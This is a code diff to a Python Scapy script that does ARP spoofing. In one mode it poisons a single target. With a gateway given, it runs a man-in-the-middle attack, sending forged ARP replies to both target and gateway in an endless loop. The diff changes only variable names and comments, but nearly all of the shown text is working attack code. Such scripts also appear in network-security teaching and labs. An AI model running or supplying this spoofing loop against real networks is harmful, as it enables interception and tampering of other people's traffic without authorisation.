@@ -36,18 +36,21 @@ target = args.target
 # If input doesn't include gw then only spoof target
 if not args.gw:
     while True:
-        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target, psrc=src, hwsrc=get_if_hwaddr(interface))
-        # print("sending '" + src + " is at ' to " + target + " using " + interface) needs to send mac so it isn't 00:00...
-        sendp(arp_request, iface=interface)
+        # Building the ARP reply to send to target
+        arp_reply = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target, psrc=src, hwsrc=get_if_hwaddr(interface))
+        # Sending the ARP reply for target to the target through the interface
+        sendp(arp_reply, iface=interface)
         time.sleep(DELAY)
 
 # Else (-gw is inputted) then man in the middle target
 else:
     while True:
-        arp_request_for_target = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target, psrc=src, hwsrc=get_if_hwaddr(interface))
-        # print("sending '" + src + " is at ' to " + target + " using " + interface) needs to send mac so it isn't 00:00...
-        sendp(arp_request_for_target, iface=interface)
-        arp_request_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=src, psrc=target, hwsrc=get_if_hwaddr(interface))
-        # print("sending '" + target + " is at ' to " + src + " using " + interface) needs to send mac so it isn't 00:00...
-        sendp(arp_request_for_gateway, iface=interface)
+        # Building the ARP reply to send to target
+        arp_reply_for_target = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target, psrc=src, hwsrc=get_if_hwaddr(interface))
+        # Sending the ARP reply for target to the target through the interface
+        sendp(arp_reply_for_target, iface=interface)
+        # Building the ARP reply to send to gateway
+        arp_reply_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=src, psrc=target, hwsrc=get_if_hwaddr(interface))
+        # Sending the ARP to the gateway reply through the interface
+        sendp(arp_reply_for_gateway, iface=interface)
         time.sleep(DELAY)
